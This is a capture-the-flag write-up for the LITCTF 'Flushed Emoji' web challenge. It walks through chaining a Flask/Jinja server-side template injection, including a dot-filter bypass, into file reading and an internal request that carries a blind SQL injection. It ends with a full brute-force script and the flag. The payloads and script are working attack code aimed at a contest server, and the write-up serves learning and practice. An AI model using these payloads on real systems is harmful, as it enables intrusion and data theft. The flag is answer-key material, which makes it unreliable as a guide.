# Flushed Emoji
> Flushed emojis are so cool! Learn more about them [here](http://litctf.live:31781/)!
>
> Downloads
> [FlushedEmojis.zip](https://drive.google.com/uc?export=download&id=1agW3a0-T4VsSJwJVTZ-dWSRLE_byxJya)

## Identifying the vulnerabilities
There's a blind SQL injection in `data-server` on line 26. in `main.py`:
```py
cur.execute("SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'");
```
However data server isn't exposed to the Internet so we'll have to find a way to trigger blind SQL injection from `main-app`.
We can't simply use this vulnerability by passing an appropriate payload in `username` or `password` because both of these fields are stripped of any non-alphanumeric characters before being sent to the database.
Fortunately there's a vulnerability in `main.py` on line 27. that can help us:
```py
return render_template_string("ok thank you for your info i have now sold your password (" + password + ") for 2 donuts :)");
```
An unescaped user-provided string (password) is rendered as a template. This is called a SSTI (Server-Side Template Injection) and leads to RCE.

## Flask SSTI basics
In Flask, the easiest way to exploit SSTI is to use `get_flashed_messages` to obtain a reference to `__builtins__` which in turn allows the attacker to execute arbitrary code. It can be done like this:
```jinja
{{ get_flashed_messages.__globals__.__builtins__ }}
```
This won't work in our case since we can't use `.` in the password:
```py
if('.' in password):
  return render_template_string("lmao no way you have . in your password LOL");
```
Fortunately, this can be easily bypassed: in Jinja (template language used in Flask) the following notations are equivalent:
```jinja
{{ a.b }}
{{ a['b'] }}
```
This means we can rewrite the mentioned builtins reference as:
```jinja
{{ get_flashed_messages["__globals__"]["__builtins__"] }}
```
Now we can start exploiting the vulnerability

## Getting the `data-server` ip address
First, we must find the IP address of the data server. To do this, we'll read the contents of the file `main.py` by using `open` function present in Python's `builtins` (note: since the code will in fact be executed by Jinja, we can't use the `__file__` variable to get the file name). This filename however contains a `.` so we'll have to find another way to represent it. We can use Python's builtin `chr` function to construct a string containing `.` from its char code (and therefore avoid using literal `.` character). As we'll be using this character a lot, we can save it to a variable called `dot`:
```py
{% set dot = get_flashed_messages["__globals__"]["__builtins__"]["chr"](46) %}
```
Now passing the following piece of code appended to the above declaration as `password` will return the content of `main.py` file:
```py
{{ get_flashed_messages["__globals__"]["__builtins__"]["open"]("main" + dot + "py")["read"]() }}
```
From the code we can read that the address of the data server is `172.24.0.8:8080`.

## Exploiting the blind SQL injection
Now we can construct a payload that will use the `requests` module to send a request to the data server to exploit the blind SQL injection. It looks like the following:
```jinja
{% set dot = get_flashed_messages["__globals__"]["__builtins__"]["chr"](46) %}{{ get_flashed_messages["__globals__"]["__builtins__"]["__import__"]("requests")["post"]('http://172' + dot + '24' + dot + '0' + dot + '8:8080/runquery', json={"username": "flag", "password": "{SQLI}"})["text"] }}
```
And `SQLI` will take the following form:
```sql
' or password like 'guessed_password%' ESCAPE '$'; --
```
(see the writeup for [../Amy The Hedgehog/README.md](this challenge) for the explanation of blind SQL injection)
The following Python script uses both vulnerabilities to get the flag:
```py
import requests
from string import printable

payload_init = '''{% set dot = get_flashed_messages["__globals__"]["__builtins__"]["chr"](46) %}{{ get_flashed_messages["__globals__"]["__builtins__"]["__import__"]("requests")["post"]('http://172' + dot + '24' + dot + '0' + dot + '8:8080/runquery', json={"username": "flag", "password": "' or password like \''''
payload_tail = '''%' ESCAPE '$'; -- "})["text"] }}'''

flag = 'LITCTF{'

while flag[-1] != '}':
	for c in printable:
		print(f'Trying {flag + c}')
		char = f'${c}' if c in ('%', '_', '$') else c
		r = requests.post(
			'http://litctf.live:31781/',
			data={
				'username': '',
				'password': payload_init + (flag + char).replace('.', '" + dot + "') + payload_tail
			}
		)

		if 'True' in r.text:
			flag += c
			break
	else:
		print('No char found!')
		break

print(flag)
```

## Flag
`LITCTF{flush3d_3m0ji_o.0}`
